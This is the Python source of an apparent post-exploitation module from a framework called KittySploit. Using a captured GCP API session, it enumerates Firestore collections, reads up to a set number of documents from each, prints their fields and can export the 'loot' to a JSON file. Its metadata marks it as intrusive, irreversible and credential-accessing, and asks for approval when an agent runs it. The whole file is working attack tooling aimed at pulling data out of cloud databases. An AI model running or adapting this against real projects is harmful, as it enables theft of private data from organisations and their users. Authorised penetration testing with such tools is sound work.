#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Firestore Documents Loot",
        "description": "List Firestore collections and read document payloads from the default database",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "firestore", "firebase", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 10,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    collection_id = OptString("", "Specific collection ID; empty reads all top-level collections", False)
    max_collections = OptInteger(10, "Maximum collections to process", False)
    max_documents = OptInteger(25, "Maximum documents per collection", False)
    mask_values = OptBool(True, "Mask document field values in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            collections = self._resolve_collections(project_id)
            if not collections:
                print_warning("No Firestore collections found")
                return self.module_result(success=True, data={"collections": []})

            max_collections = max(1, int(self.max_collections or 10))
            max_documents = max(1, int(self.max_documents or 25))
            loot = []

            print_info(f"Looting Firestore documents from {min(len(collections), max_collections)} collection(s)...")
            for collection in collections[:max_collections]:
                print_info(f"Collection: {collection}")
                documents = self._list_documents(project_id, collection, max_documents)
                entry = {
                    "collection": collection,
                    "document_count": len(documents),
                    "documents": documents,
                }
                for doc in documents[:5]:
                    name = str(doc.get("name") or "").rsplit("/", 1)[-1]
                    fields = doc.get("fields") or {}
                    print_success(f"  document: {name} ({len(fields)} field(s))")
                    if fields and not self.mask_values:
                        print_info(f"    fields: {json.dumps(fields, ensure_ascii=False)[:500]}")
                    elif fields:
                        print_info(f"    fields: {self._gcp_mask_value(json.dumps(fields, ensure_ascii=False))}")
                if len(documents) > 5:
                    print_info(f"  ... and {len(documents) - 5} more document(s)")
                loot.append(entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "collections": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} collection(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Firestore document loot failed: {exc}")
            return False

    def _resolve_collections(self, project_id):
        configured = str(self.collection_id or "").strip()
        if configured:
            return [configured]

        body = self._gcp_body_dict("firestore_collections")
        return list(body.get("collectionIds") or [])

    def _list_documents(self, project_id, collection_id, max_documents):
        parent = (
            f"https://firestore.googleapis.com/v1/projects/{self._quote_project(project_id)}"
            f"/databases/(default)/documents/{collection_id}"
        )
        params = {"pageSize": min(max_documents, 300)}
        return self._gcp_paginate_get(parent, "documents", max_items=max_documents, params=params)
